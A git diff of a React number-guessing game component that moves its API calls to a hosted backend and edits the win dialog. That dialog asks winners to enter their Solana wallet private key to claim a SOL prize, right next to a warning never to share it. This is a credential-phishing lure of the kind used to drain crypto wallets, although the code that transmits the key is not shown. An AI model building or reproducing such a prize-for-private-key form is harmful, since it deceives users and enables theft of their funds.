@@ -1,7 +1,7 @@
 "use client";
 
 import React, { useState, useEffect } from "react";
-import { Sparkles, Target, Trophy, AlertCircle, Send, X } from 'lucide-react';
+import { Sparkles, Target, Trophy, AlertCircle, Send } from 'lucide-react';
 import { Alert, AlertDescription } from "@/components/ui/alert";
 import {
   Dialog,
@@ -32,7 +32,7 @@ export default function GuessGame() {
   const startGame = async () => {
     setIsLoading(true);
     try {
-      const res = await fetch("http://localhost:8080/start");
+      const res = await fetch("https://rust-project-x3jh.onrender.com/start");
       if (!res.ok) throw new Error("Failed to start the game");
       const data = await res.json();
       setMessages([data.message]);
@@ -56,7 +56,7 @@ export default function GuessGame() {
 
     setIsLoading(true);
     try {
-      const res = await fetch("http://localhost:8080/guess", {
+      const res = await fetch("https://rust-project-x3jh.onrender.com/guess", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ guess: guessNumber }),
@@ -98,6 +98,7 @@ export default function GuessGame() {
 
   return (
     <div className="flex flex-col items-center justify-center min-h-screen bg-gradient-to-b from-gray-900 to-gray-800 text-white p-8">
+      
       {/* Notifications */}
       <div className="fixed top-0 left-0 right-0 z-50 flex flex-col items-center">
         {notifications.map((notification, index) => (
@@ -180,9 +181,9 @@ export default function GuessGame() {
             <DialogTitle className="text-2xl font-bold text-center mb-4">
               🎉 Congratulations! You Won!
             </DialogTitle>
-            <DialogDescription className="text-center text-gray-300">
-              <p className="font-bold">⚠️🚨 Never Share Your Private Key with Anyone! 🚨⚠️</p>
-              Enter your private key  to claim your prize of {prize.toFixed(4)} SOL.
+            <DialogDescription className="text-center text-gray-300" asChild>
+              <p className="font-bold">⚠️🚨 Never Share Your Private Key with Anyone! <br /> Enter your private key  to claim your prize of {prize.toFixed(4)} SOL. 🚨⚠️</p>
+              
             </DialogDescription>
           </DialogHeader>
 
